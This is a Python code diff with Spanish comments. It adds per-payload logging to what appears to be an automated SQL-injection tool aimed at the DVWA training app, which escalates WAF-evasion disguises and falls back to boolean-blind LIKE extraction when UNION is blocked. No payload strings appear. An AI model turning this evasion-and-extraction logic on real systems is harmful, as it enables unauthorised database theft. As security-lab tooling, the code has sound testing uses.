@@ -59,6 +59,7 @@ class Orchestrator:
 
         engine = EvasionEngine()
         counter = {"steps": 0}
+        payload_log: list[dict] = []   # cada payload que se envía, con su estado (para auditar/exportar)
 
         def probe(base_sql: str) -> ProbeResult:
             # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
@@ -70,6 +71,8 @@ class Orchestrator:
                     return ProbeResult(blocked=True)
                 counter["steps"] += 1
                 resp = self.dvwa.run_sqli(payload, level)
+                payload_log.append({"payload": payload, "phase": "descubrimiento",
+                                    "blocked": resp.blocked, "http_status": resp.http_status})
                 if resp.blocked:
                     say(f"[WAF] bloqueó (HTTP {resp.http_status}) — escalando evasión")
                     engine.record(pipeline, payload, blocked=True)
@@ -115,7 +118,7 @@ class Orchestrator:
         if not success:
             # Fallback boolean-blind: si UNION está bloqueado pero el booleano pasa (p. ej. NAXSI
             # bloquea UNION/SELECT pero deja LIKE), extrae carácter por carácter con LIKE.
-            blind = self._blind_fallback(engine, level, deadline, counter, say)
+            blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
             if blind:
                 extracted, success = [blind], True
                 res.trace.append(f"extracción boolean-blind (LIKE): {blind}")
@@ -132,9 +135,10 @@ class Orchestrator:
             strategy=strategy,
             trace=res.trace,
             waf_profile=engine.profile.summary(),
+            payloads=payload_log,
         )
 
-    def _blind_fallback(self, engine, level, deadline, counter, say):
+    def _blind_fallback(self, engine, level, deadline, counter, say, payload_log):
         """Extracción boolean-blind con LIKE cuando UNION está bloqueado pero el booleano pasa."""
         def oracle(payload: str) -> bool:
             while time.monotonic() < deadline:
@@ -143,6 +147,8 @@ class Orchestrator:
                     return False
                 counter["steps"] += 1
                 resp = self.dvwa.run_sqli(p, level)
+                payload_log.append({"payload": p, "phase": "blind",
+                                    "blocked": resp.blocked, "http_status": resp.http_status})
                 if resp.blocked:
                     engine.record(pipe, p, blocked=True)
                     continue
